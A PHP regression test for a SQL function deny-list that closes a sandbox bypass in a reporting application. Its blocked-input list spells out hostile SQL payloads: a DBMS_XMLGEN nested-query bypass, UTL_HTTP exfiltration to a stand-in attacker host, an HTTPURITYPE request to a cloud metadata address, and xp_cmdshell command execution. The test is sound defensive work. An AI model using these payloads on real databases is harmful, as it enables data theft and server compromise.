<?php
/**
 * penumbra_tests/sqlfn - the SQL function / package deny-list.
 *
 * Guards the 2026-09-04 fix for the user-SQL sandbox bypass: the table
 * allow-list extractor (penumbraExtractSqlTables) deletes string literals before
 * it scans and only ever judges FROM/JOIN names, so
 *     SELECT DBMS_XMLGEN.GETXML('SELECT ... FROM anything') FROM DUAL
 * reached the gate with DUAL as its only table and ran the inner SQL ungated on
 * the reporting account - for any authenticated viewer of any public report.
 * penumbraSqlForbiddenFunction() (db_connection.php) is the name-level deny that
 * closes it; query.php's gate and shared_logic.php's subquery gate both call it.
 *
 * Lifts the REAL function out of the live db_connection.php by tokenizer
 * (db_connection.php cannot be require'd - it wants a live config + DB creds).
 *
 *   php.exe -n test_sqlfn.php [--control]
 *
 * --control adds one deliberately false assertion, which MUST report FAIL.
 * A TARGETED MUTANT always runs too: the lifted source with the DBMS_/UTL_
 * family pattern broken must MISS the headline payload - proving the BLOCKED
 * assertions can actually fail. A harness that has never been seen to fail has
 * not been seen to work.
 *
 * EXPECTED TAIL: "PASS 44   FAIL 0". A smaller pass count is a failure too.
 */
$CONTROL = in_array('--control', $argv, true);
$pass = 0; $fail = 0;
function ok($cond, $label) {
    global $pass, $fail;
    if ($cond) { $pass++; } else { $fail++; echo "    FAIL  $label\n"; }
}

$SRC = @file_get_contents('\\\\oitras.oit.ncsu.edu\\c$\\inetpub\\wwwroot\\sponsor_migration\\penumbra\\db_connection.php');
if ($SRC === false) $SRC = @file_get_contents('C:/inetpub/wwwroot/sponsor_migration/penumbra/db_connection.php');
if ($SRC === false) { fwrite(STDERR, "FATAL: cannot read db_connection.php\n"); exit(2); }

/** Lift one NAMED function's source (from `function` to its matching `}`). */
function lift_function($src, $name) {
    $tokens = token_get_all($src);
    $n = count($tokens);
    for ($i = 0; $i < $n; $i++) {
        if (!is_array($tokens[$i]) || $tokens[$i][0] !== T_FUNCTION) continue;
        $j = $i + 1;
        while ($j < $n && is_array($tokens[$j]) && $tokens[$j][0] === T_WHITESPACE) $j++;
        if ($j < $n && !is_array($tokens[$j]) && $tokens[$j] === '&') {
            $j++;
            while ($j < $n && is_array($tokens[$j]) && $tokens[$j][0] === T_WHITESPACE) $j++;
        }
        if (!($j < $n && is_array($tokens[$j]) && $tokens[$j][0] === T_STRING && $tokens[$j][1] === $name)) continue;
        $depth = 0; $started = false; $buf = '';
        for ($k = $i; $k < $n; $k++) {
            $t = $tokens[$k]; $txt = is_array($t) ? $t[1] : $t;
            $buf .= $txt;
            if ($txt === '{') { $depth++; $started = true; }
            elseif ($txt === '}') { $depth--; if ($started && $depth === 0) return $buf; }
        }
    }
    return null;
}

$buf = lift_function($SRC, 'penumbraSqlForbiddenFunction');
if ($buf === null) { fwrite(STDERR, "FATAL: could not lift penumbraSqlForbiddenFunction()\n"); exit(2); }
eval($buf);
ok(function_exists('penumbraSqlForbiddenFunction'), 'function lifted from the live db_connection.php and defined');

echo "BLOCKED (must return the named token)\n";
$blocked = array(
    array("SELECT DBMS_XMLGEN.GETXML('SELECT STATE_DATA FROM PENUMBRA_REPORTS') AS X FROM DUAL", 'DBMS_XMLGEN', 'the headline payload: SQL as a string'),
    array("select dbms_xmlgen.getxml('select 1 from dual') from dual", 'DBMS_XMLGEN', 'lower case'),
    array("SELECT SYS.DBMS_XMLGEN.GETXML('x') FROM DUAL", 'DBMS_XMLGEN', 'schema-qualified SYS.'),
    array('SELECT "DBMS_XMLGEN"."GETXML"(\'x\') FROM DUAL', 'DBMS_XMLGEN', 'quoted identifiers'),
    array("SELECT DBMS_XMLGEN.GETXMLTYPE('x') FROM DUAL", 'DBMS_XMLGEN', 'GETXMLTYPE variant'),
    array("SELECT DBMS_XMLQUERY.GETXML('x') FROM DUAL", 'DBMS_XMLQUERY', 'DBMS_XMLQUERY'),
    array("SELECT DBMS_METADATA.GET_DDL('TABLE','AWARD') FROM DUAL", 'DBMS_METADATA', 'DBMS_METADATA'),
    array("SELECT DBMS_SQL.OPEN_CURSOR FROM DUAL", 'DBMS_SQL', 'DBMS_SQL'),
    array("SELECT DBMS_JAVA.RUNJAVA('x') FROM DUAL", 'DBMS_JAVA', 'any other DBMS_ member is denied by default'),
    array("SELECT UTL_HTTP.REQUEST('http://attacker/'||USER) FROM DUAL", 'UTL_HTTP', 'UTL_HTTP exfil'),
    array("SELECT UTL_INADDR.GET_HOST_ADDRESS('x') FROM DUAL", 'UTL_INADDR', 'UTL_INADDR recon'),
    array("SELECT UTL_TCP.AVAILABLE FROM DUAL", 'UTL_TCP', 'UTL_TCP'),
    array("SELECT HTTPURITYPE('http://169.254.169.254/').GETCLOB() FROM DUAL", 'HTTPURITYPE', 'HTTPURITYPE SSRF'),
    array("SELECT DBURITYPE('/PUBLIC/x').GETCLOB() FROM DUAL", 'DBURITYPE', 'DBURITYPE'),
    array("SELECT * FROM XMLTABLE('ora:view(\"PENUMBRA_REPORTS\")' COLUMNS x VARCHAR2(10) PATH '@x')", 'XMLTABLE', 'XMLTABLE ora:view'),
    array("SELECT XMLQUERY('fn:collection(\"oradb:/X\")' RETURNING CONTENT) FROM DUAL", 'XMLQUERY', 'XMLQUERY fn:collection'),
    array("SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM DUAL", 'SYS_CONTEXT', 'SYS_CONTEXT recon'),
    array("WITH FUNCTION f RETURN NUMBER IS BEGIN RETURN 1; END; SELECT f() FROM DUAL", 'WITH FUNCTION', 'PL/SQL in WITH'),
    array("BEGIN EXECUTE IMMEDIATE 'x'; END;", 'EXECUTE IMMEDIATE', 'EXECUTE IMMEDIATE'),
    array("SELECT KUPP\$PROC.CREATE_MASTER_PROCESS('x') FROM DUAL", 'KUPP$PROC', 'Data Pump internals'),
    array("SELECT * FROM OPENQUERY(LNK, 'SELECT * FROM x')", 'OPENQUERY', 'T-SQL OPENQUERY'),
    array("SELECT * FROM OPENROWSET('SQLNCLI','Server=x;','SELECT 1')", 'OPENROWSET', 'T-SQL OPENROWSET'),
    array("SELECT 1; EXEC master..xp_cmdshell 'dir'", 'XP_CMDSHELL', 'xp_ extended procedures'),
    array("SELECT 1; EXEC sp_executesql N'SELECT 1'", 'SP_EXECUTESQL', 'sp_executesql'),
    array("SELECT 1 WAITFOR DELAY '0:0:5'", 'WAITFOR', 'WAITFOR delay'),
    array("SELECT EXEC('SELECT 1') FROM DUAL", 'EXEC(', 'EXEC( dynamic call shape'),
    array("SELECT * FROM DUAL /* DBMS_XMLGEN in a comment */ WHERE DBMS_XMLGEN.X = 1", 'DBMS_XMLGEN', 'a real reference beside a commented one'),
);
foreach ($blocked as $c) {
    $r = penumbraSqlForbiddenFunction($c[0]);
    ok($r === $c[1], 'BLOCKED ' . $c[2] . ' -> ' . var_export($r, true));
}

echo "ALLOWED (must return null)\n";
$allowed = array(
    array("SELECT DBMS_LOB.SUBSTR(NOTES, 4000, 1) AS N FROM AWARD", 'DBMS_LOB (the documented CLOB helper)'),
    array("SELECT DBMS_RANDOM.VALUE FROM DUAL", 'DBMS_RANDOM'),
    array("SELECT UTL_RAW.CAST_TO_VARCHAR2(X) FROM AWARD", 'UTL_RAW'),
    array("SELECT UTL_MATCH.JARO_WINKLER_SIMILARITY(A, B) FROM AWARD", 'UTL_MATCH'),
    array("SELECT * FROM AWARD /* DBMS_XMLGEN? no */ WHERE 1 = 1", 'name only inside a block comment'),
    array("SELECT * FROM AWARD -- DBMS_XMLGEN\n WHERE 1 = 1", 'name only inside a line comment'),
    array("SELECT * FROM AWARD WHERE NOTES = 'call DBMS_XMLGEN.GETXML now'", 'name only inside a string literal is inert data'),
    array("SELECT * FROM AWARD WHERE TITLE = 'Bulk insert of data'", 'keyword phrase inside a literal'),
    array("SELECT SYSDATE, USER, EXTRACT(YEAR FROM SYSDATE) FROM DUAL", 'plain functions'),
    array("SELECT EXECUTIVE_SUMMARY, USERENV_FLAG FROM AWARD WHERE NOTE LIKE '%exec%'", 'near-miss identifiers'),
    array("SELECT * FROM JSON_TABLE(:j, '\$[*]' COLUMNS (x PATH '\$.x'))", 'JSON_TABLE transport'),
    array("SELECT a.*, TRIM(b.x) FROM AWARD a JOIN SUBAWARD b ON a.id = b.id", 'an ordinary join'),
    array("", 'empty'),
);
foreach ($allowed as $c) {
    $r = penumbraSqlForbiddenFunction($c[0]);
    ok($r === null, 'ALLOWED ' . $c[1] . ' -> ' . var_export($r, true));
}
ok(penumbraSqlForbiddenFunction(null) === null, 'non-string input is treated as clean (callers validate the type)');

echo "MUTANT (the family pattern broken - must MISS the headline payload)\n";
$mut = str_replace('penumbraSqlForbiddenFunction', 'penumbraSqlForbiddenFunction_mut', $buf);
$mut = str_replace('(?:DBMS|UTL)_', '(?:DBMX|UTL)_', $mut);
ok(strpos($mut, 'DBMX') !== false, 'mutant: the family pattern was actually rewritten');
eval($mut);
ok(function_exists('penumbraSqlForbiddenFunction_mut')
   && penumbraSqlForbiddenFunction_mut("SELECT DBMS_XMLGEN.GETXML('x') FROM DUAL") === null,
   'mutant misses the headline payload, so the BLOCKED assertions above can fail');

if ($CONTROL) {
    echo "Control (must FAIL)\n";
    ok(false, 'control: a deliberately false assertion');
}

echo "\nPASS $pass   FAIL $fail\n";
exit($fail === 0 ? 0 : 1);
